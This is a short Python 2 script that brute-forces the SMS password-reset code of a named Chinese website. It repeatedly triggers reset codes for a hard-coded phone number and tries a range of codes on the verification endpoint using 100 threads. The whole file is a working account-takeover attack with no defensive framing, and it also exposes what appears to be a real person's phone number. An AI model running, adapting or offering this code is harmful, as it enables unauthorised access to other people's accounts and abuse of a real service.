#!/usr/bin/python2.7
#coding:utf-8

import sys
import time
import requests
from concurrent import futures

phone = '+86-15869103136'
agent = 'Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16'
headers = {'User-Agent':agent}
	
def refreshCode():
	url = 'http://www.zaijia.cn/user/password/sendSmsCode'
	data={'phone':phone}
	while True:
		for i in range(5):
			try:
				a = requests.post(url,data=data,headers=headers)
				if a.status_code == 200:
					print 'refresh code success'
				break
			except Exception, e:
				raise e

		time.sleep(60*5)	# 5分钟发送一次

def burpCode(code):
	url = 'http://www.zaijia.cn/user/password/checkCode'
	data = {'phone':phone,'sms_code':code}
	for i in range(5):
		try:
			a = requests.post(url,data=data,headers=headers)
			if a.status_code == 200 and 'true' in a.text:
				print code,'success'
				sys.exit()
			else:
				print code,'fail'
			break
		# exceptions cased by multi threads
		except Exception,e:
			print 'Exception',e
			pass

def main():
	# fs = {}
	with futures.ThreadPoolExecutor(max_workers=100) as executor:      #默认10线程
		time.clock()
		executor.submit(refreshCode)
		time.sleep(1)
		for i in xrange(130000,134800):
			future = executor.submit(burpCode,str(i))
		print time.clock()
# ----------------------------------------------------------------------------------------------------
#
# ----------------------------------------------------------------------------------------------------
if __name__=='__main__':
	main()
	# burpCode('134780')
	pass